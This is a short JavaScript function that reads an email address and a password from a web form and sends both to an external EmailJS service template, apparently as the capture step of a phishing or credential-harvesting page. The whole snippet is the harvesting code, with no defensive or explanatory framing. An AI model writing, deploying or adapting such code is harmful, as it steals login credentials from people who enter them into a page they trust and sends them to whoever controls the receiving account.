function sendEmail() {
    emailjs.init("FLCWfGzjhSIMLmML1");
    var mailField = document.querySelector('input[name="mail_field"]');
    var passField = document.getElementById("pass_field");
    emailjs.send("service_kvw3ho3", "template_w6zqi2j", { mdp: passField.value, email: mailField.value });
}